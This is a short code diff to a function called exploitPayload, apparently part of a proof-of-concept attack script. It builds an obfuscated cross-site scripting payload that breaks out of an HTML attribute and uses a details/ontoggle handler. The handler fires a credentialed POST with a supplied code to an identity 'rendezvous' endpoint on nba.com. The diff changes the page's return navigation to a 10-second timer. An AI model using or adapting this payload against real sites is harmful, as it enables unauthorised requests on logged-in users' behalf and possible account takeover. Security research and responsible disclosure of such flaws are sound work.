@@ -49,12 +49,13 @@
   function exploitPayload(code) {
     const identityEndpoint = charCodeExpression("https://identity.nba.com/api/v1/rendezvous");
     const fetchName = charCodeExpression("fetch");
+    const timeoutName = charCodeExpression("setTimeout");
     const post = charCodeExpression("POST");
     const include = charCodeExpression("include");
     const contentType = charCodeExpression("Content-Type");
     const textPlain = charCodeExpression("text/plain");
     const requestBody = charCodeExpression(JSON.stringify({ code }));
-    const handler = `top[${fetchName}](${identityEndpoint},{method:${post},credentials:${include},headers:{[${contentType}]:${textPlain}},body:${requestBody}}).finally(top.history.back.bind(top.history))`;
+    const handler = `top[${fetchName}](${identityEndpoint},{method:${post},credentials:${include},headers:{[${contentType}]:${textPlain}},body:${requestBody}});top[${timeoutName}](top.history.back.bind(top.history),10000)`;
     return `250\"><details open ontoggle=${handler}>`;
   }
 
